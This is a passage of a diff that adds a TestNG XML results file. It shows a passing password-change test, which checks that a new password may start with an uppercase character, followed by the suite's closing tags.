+        </test-method> <!-- validNewPasswordStartsWithLowerCase -->
+        <test-method status="PASS" signature="validNewPasswordStartsWithUpperCase(java.lang.reflect.Method)[pri:0, instance:tests.ChangePasswordTest@6fdbe764]" name="validNewPasswordStartsWithUpperCase" duration-ms="2" started-at="2020-02-23T12:55:51 IST" description="Valid new password starts with a upper case character" finished-at="2020-02-23T12:55:51 IST">
+          <params>
+            <param index="0">
+              <value>
+                <![CDATA[public void tests.ChangePasswordTest.validNewPasswordStartsWithUpperCase(java.lang.reflect.Method)]]>
+              </value>
+            </param>
+          </params>
+          <reporter-output>
+          </reporter-output>
+        </test-method> <!-- validNewPasswordStartsWithUpperCase -->
+      </class> <!-- tests.ChangePasswordTest -->
+    </test> <!-- Change Password Test -->
+  </suite> <!-- N11 Test Suite -->
+</testng-results>
